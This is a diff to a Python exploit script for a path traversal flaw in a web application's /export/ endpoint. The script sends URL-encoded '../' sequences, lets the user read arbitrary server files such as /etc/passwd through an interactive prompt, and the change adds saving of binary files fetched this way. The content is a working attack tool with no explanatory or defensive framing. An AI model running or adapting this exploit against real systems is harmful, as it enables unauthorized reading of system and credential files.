@@ -125,23 +125,33 @@ def trigger_file_creation(target_url, book_id):
 
 
 def read_file(target_url, file_to_read):
+    output_mode = ""
+    file_contents = ""
+
     if target_url.endswith('/'):
         export_url = target_url + "export/%2e%2e%2f%2e%2e" + file_to_read
     else:
         export_url = target_url + "/export/%2e%2e%2f%2e%2e" + file_to_read
 
     print()
-    r = session.get(export_url)
-    file_contents = r.text
+    r = session.get(export_url, stream=True)
 
-    return file_contents
+    if b"ELF" in r.content or b"/lib/ld-linux-x86-64.so.2" in r.content or b"__libc_start_main__cxa_" in r.content:
+        output_mode = "binary"
+        file_contents = r.content
+    else:
+        output_mode = "text"
+        file_contents = r.text
+
+    return file_contents, r, output_mode
 
 
 def main():
     print("[*] Could use the -o option to output to a file, ie. /etc/passwd -o passwd")
-    file_to_read = ""
+    output = False
 
     while True:
+        file_to_read = ""
         try:
             file = input("file> ")
 
@@ -152,7 +162,8 @@ def main():
             elif file == "\n":
                 continue
 
-            elif " -o" in file:
+            elif " -o " in file:
+                output = True
                 file_to_read = file.split(" ")[0]
 
         except KeyboardInterrupt:
@@ -171,20 +182,33 @@ def main():
             book_id = find_id(target_url,  session)
 
             trigger_file_creation(target_url, book_id)
-            if file_to_read:
-                file_contents = read_file(target_url, file_to_read)
+
+            if file_to_read != "":
+                file_contents, resp, output_mode = read_file(target_url, file_to_read)
             else:
-                file_contents = read_file(target_url, file)
-            if "500 Internal Server Error" in file_contents:
+                file_contents, resp, output_mode = read_file(target_url, file)
+
+            if output_mode == "binary" and not output:
+                print("[!] You tried to read a binary file, download it instead.")
+                continue
+            elif output_mode == "binary" and output:
+                pass
+            elif "500 Internal Server Error" in file_contents:
                 print("[!] Error. You don't have permissions to read the file, you didn't send a filename to read or you probably tried to list a directory and you can't do that. Can only read files.\n")
             else:
                 print(file_contents)
 
-            if " -o" in file:
+            if output:
                 output_file = file.split(" ")[2]
                 print("[+] Writing to file:", output_file + "\n")
-                with open(output_file, "w") as f:
-                    f.write(file_contents)
+
+                if output_mode == "text":
+                    with open(output_file, "w") as f:
+                        f.write(file_contents)
+                else:
+                    with open(output_file, "wb") as f:
+                        for chunk in resp.iter_content(chunk_size=8192):
+                            f.write(chunk)
 
 
 if __name__ == "__main__":
